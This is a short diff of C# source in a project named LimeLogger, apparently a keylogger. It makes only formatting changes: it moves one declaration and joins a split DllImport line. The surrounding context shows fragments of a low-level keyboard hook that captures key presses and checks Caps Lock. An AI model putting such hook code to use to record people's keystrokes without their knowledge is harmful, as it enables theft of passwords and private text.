@@ -41,8 +41,8 @@ namespace LimeLogger
             if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
             {
                 int vkCode = Marshal.ReadInt32(lParam);
-                string currentKey = null;
                 bool CapsLock = (((ushort)GetKeyState(0x14)) & 0xffff) != 0;
+                string currentKey = null;
                 currentKey = KeyboardLayout((uint)vkCode);
 
                 if ((Keys)vkCode >= Keys.A && (Keys)vkCode <= Keys.Z)
@@ -193,8 +193,7 @@ namespace LimeLogger
         [return: MarshalAs(UnmanagedType.Bool)]
         private static extern bool UnhookWindowsHookEx(IntPtr hhk);
         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
-        IntPtr wParam, IntPtr lParam);
+        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
         [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         private static extern IntPtr GetModuleHandle(string lpModuleName);
 
